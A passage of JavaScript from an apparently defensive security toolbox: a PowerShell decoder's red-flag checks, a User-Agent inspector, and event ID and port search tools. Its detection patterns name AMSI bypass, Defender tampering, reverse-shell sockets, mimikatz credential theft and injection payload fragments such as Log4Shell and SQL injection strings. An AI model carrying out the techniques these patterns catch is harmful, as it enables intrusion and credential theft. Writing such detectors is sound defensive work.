    [/AmsiUtils|amsiInitFailed/i, "Disables AMSI scanning"], [/Add-MpPreference|Set-MpPreference/i, "Changes Microsoft Defender settings"], [/Reflection\.Assembly\]::Load|VirtualAlloc/i, "Loads code straight into memory"],
    [/Net\.Sockets\.TCPClient|GetStream\(\)/i, "Opens a raw network connection (reverse shell pattern)"], [/mimikatz|sekurlsa|Invoke-Mimikatz/i, "Credential theft tooling"], [/-join\s*\(|\[char\]\d+/i, "Character-code obfuscation"]];
  for (const [rx, why] of R) if (rx.test(text + "\n" + cur)) flags.push(why);
  const iocs = iocText(extract(cur));
  return `${layers.length ? layers.map((l, i) => `${i + 1}. ${l}`).join("\n") + "\n\n" : "Nothing encoded found. Showing the input.\n\n"}Decoded script:\n${cur.split("\n").slice(0, 60).map((l) => "  " + l).join("\n")}\n\n${flags.length ? flags.map((f) => "• " + f).join("\n") : "No classic red flags."}${iocs ? "\n\n" + iocs : ""}`;
}

// ---------- User-Agent inspector ----------
// Current major versions estimated from each browser's measured release cadence, so it never needs a manual update.
const est = (base, date, days) => base + Math.floor((Date.now() - Date.parse(date)) / (days * 864e5));
const CHROME = () => est(120, "2023-12-05", 31.6), FIREFOX = () => est(121, "2023-12-19", 28.8);
function userAgent(raw) {
  const ua = raw.trim(); if (!ua) return "";
  const flags = []; let browser = "Unknown", os = "Unknown", kind = "Browser";
  const TOOLS = [[/sqlmap/i, "sqlmap (SQL injection scanner)"], [/nikto/i, "Nikto (web scanner)"], [/nmap|Nmap Scripting Engine/i, "Nmap"], [/masscan/i, "masscan"], [/zgrab/i, "ZGrab (internet scanner)"], [/nuclei/i, "Nuclei (vulnerability scanner)"],
    [/wpscan/i, "WPScan"], [/hydra/i, "Hydra (password brute forcer)"], [/gobuster|dirbuster|ffuf|feroxbuster/i, "Directory brute forcer"], [/acunetix|netsparker|qualys|nessus|openvas/i, "Commercial vulnerability scanner"],
    [/python-requests|python-urllib|aiohttp|httpx/i, "Python script"], [/\bcurl\//i, "curl"], [/\bwget\//i, "Wget"], [/Go-http-client/i, "Go program"], [/okhttp/i, "OkHttp (Java/Android library)"], [/^Java\//i, "Java program"],
    [/libwww-perl/i, "Perl script"], [/WindowsPowerShell|PowerShell\//i, "PowerShell"], [/axios|node-fetch|undici/i, "Node.js script"]];
  const BOTS = [[/Googlebot/i, "Googlebot"], [/bingbot/i, "Bingbot"], [/YandexBot/i, "YandexBot"], [/Baiduspider/i, "Baiduspider"], [/DuckDuckBot/i, "DuckDuckBot"], [/facebookexternalhit/i, "Facebook link preview"], [/GPTBot|ClaudeBot|anthropic-ai|PerplexityBot|CCBot|Google-Extended|Bytespider/i, "AI crawler"], [/AhrefsBot|SemrushBot|MJ12bot|DotBot/i, "SEO crawler"]];
  const tool = TOOLS.find(([rx]) => rx.test(ua)); const bot = BOTS.find(([rx]) => rx.test(ua));
  if (tool) { kind = "Tool or script"; browser = tool[1]; flags.push(/scanner|brute|sqlmap|Nmap|masscan|ZGrab|WPScan|Hydra|Nuclei/i.test(tool[1]) ? `${tool[1]}: offensive tooling. Check what it requested and from where.` : `${tool[1]}: not a person in a browser. Fine for known automation, odd for a user login.`); }
  else if (bot) { kind = "Crawler"; browser = bot[1]; flags.push("Claims to be a crawler. Real ones come from the company's published IP ranges; fakes are common."); }
  const v = (rx) => +(ua.match(rx) || [])[1] || 0;
  if (!tool && !bot) {
    if (/HeadlessChrome/.test(ua)) { browser = `Headless Chrome ${v(/HeadlessChrome\/(\d+)/)}`; flags.push("Headless browser: automation such as Puppeteer or Playwright, common in scraping and credential stuffing."); }
    else if (/Edg\//.test(ua)) browser = `Edge ${v(/Edg\/(\d+)/)}`;
    else if (/OPR\//.test(ua)) browser = `Opera ${v(/OPR\/(\d+)/)}`;
    else if (/Firefox\//.test(ua)) browser = `Firefox ${v(/Firefox\/(\d+)/)}`;
    else if (/Chrome\//.test(ua)) browser = `Chrome ${v(/Chrome\/(\d+)/)}`;
    else if (/Version\/[\d.]+.*Safari/.test(ua)) browser = `Safari ${v(/Version\/(\d+)/)}`;
    else if (/MSIE |Trident\//.test(ua)) { browser = "Internet Explorer"; flags.push("Internet Explorer is retired. Real users rarely have it now; old malware and scanners still claim it."); }
    const ch = v(/Chrome\/(\d+)/), ff = v(/Firefox\/(\d+)/);
    if (ch && !/Edg\/|OPR\//.test(ua) && ch < CHROME() - 11) flags.push(`Chrome ${ch} is over a year out of date (current is about ${CHROME()}). Old versions are often hard-coded in malware and bots.`);
    if (ff && ff < FIREFOX() - 12) flags.push(`Firefox ${ff} is over a year out of date (current is about ${FIREFOX()}).`);
  }
  if (/Windows NT 10\.0/.test(ua)) os = "Windows 10 or 11"; else if (/Windows NT 6\.3/.test(ua)) os = "Windows 8.1"; else if (/Windows NT 6\.1/.test(ua)) os = "Windows 7"; else if (/Windows NT 5\./.test(ua)) os = "Windows XP";
  else if (/iPhone|iPad/.test(ua)) os = "iOS or iPadOS"; else if (/Android/.test(ua)) os = `Android ${v(/Android (\d+)/) || ""}`.trim(); else if (/Mac OS X/.test(ua)) os = "macOS"; else if (/CrOS/.test(ua)) os = "ChromeOS"; else if (/Linux/.test(ua)) os = "Linux";
  if (/Windows NT (5\.|6\.[01])/.test(ua)) flags.push(`${os} has been unsupported for years. Real users on it are rare.`);
  if (/\$\{jndi:|<script|union\s+select|\.\.\/|' or '1'='1|\bsleep\(\d/i.test(ua)) flags.push("The User-Agent itself contains an attack payload (Log4Shell, XSS, SQL injection or path traversal). Someone is probing.");
  if (ua.length < 12) flags.push("Very short User-Agent: almost certainly a script.");
  if (ua.length > 400) flags.push("Very long User-Agent: can be padding or an injection attempt.");
  return `Type: ${kind}\nClient: ${browser}\nSystem: ${os}\nLength: ${ua.length} characters\n\n${flags.length ? flags.map((f) => "• " + f).join("\n") : "Looks like an ordinary, current browser."}`;
}

// ---------- Windows event IDs ----------
function eventTool(box) {
  const q = h("input.tbx-search", { type: "search", placeholder: "Event ID or words, e.g. 4625, Kerberos, lsass, scheduled task", "aria-label": "Search event IDs", autocomplete: "off" });
  const logs = ["All", ...new Set(EVENT_IDS.map((e) => e[1]))]; let log = "All";
  const chips = h("div.seg.wraptabs", logs.map((l) => h("button" + (l === log ? ".on" : ""), { type: "button", onclick: (e) => { log = l; [...chips.children].forEach((x) => x.classList.toggle("on", x === e.currentTarget)); draw(); } }, l)));
  const list = h("div.ev-list");
  const draw = () => {
    const s = q.value.trim().toLowerCase();
    const hits = EVENT_IDS.filter(([id, lg, what, why]) => (log === "All" || lg === log) && (!s || String(id) === s || `${id} ${lg} ${what} ${why}`.toLowerCase().includes(s)));
    put(list, hits.length ? hits.slice(0, 40).map(([id, lg, what, why]) => h("article.ev", h("span.ev-id.l-" + lg.toLowerCase(), String(id)), h("div", h("b", what), h("span.ev-log", lg), h("p", why))))
      : h("p.muted", "No match. Try the number alone, or a word like 'logon'."));
  };
  q.addEventListener("input", draw); draw();
  put(box, q, chips, list, h("p.muted.small", "Security log IDs need the right audit policy turned on. Sysmon IDs need Sysmon installed."));
}

// ---------- Port lookup ----------
function portTool(box) {
  const q = h("input.tbx-search", { type: "search", placeholder: "Port number or service, e.g. 445, RDP, redis", "aria-label": "Search ports", autocomplete: "off" });
  const list = h("div.ev-list"); let live = [];
  const draw = () => {
    const s = q.value.trim().toLowerCase(); const rank = Object.fromEntries(live.map((p, i) => [p[0], i + 1]));
    const hits = PORT_INFO.filter(([p, n, why]) => !s || String(p) === s || `${p} ${n} ${why}`.toLowerCase().includes(s));
    const sorted = s ? hits : [...hits].sort((a, b) => (rank[a[0]] || 99) - (rank[b[0]] || 99));
    put(list, sorted.length ? sorted.slice(0, 40).map(([p, n, why]) => h("article.ev", h("span.ev-id.l-port", String(p)), h("div", h("b", n), rank[p] ? h("span.ev-hot", `#${rank[p]} most scanned today`) : null, h("p", why))))
      : h("p.muted", /^\d+$/.test(s) ? "Not in our list. Check IANA's port registry, and remember any service can run on any port." : "No match."));
  };
  q.addEventListener("input", draw); draw();
  load("threatmap").then((tm) => { live = tm?.ports || []; draw(); });
  put(box, q, list, h("p.muted.small", "Live ranking from SANS Internet Storm Center sensors. Any service can run on any port, so confirm with the traffic itself."));
}
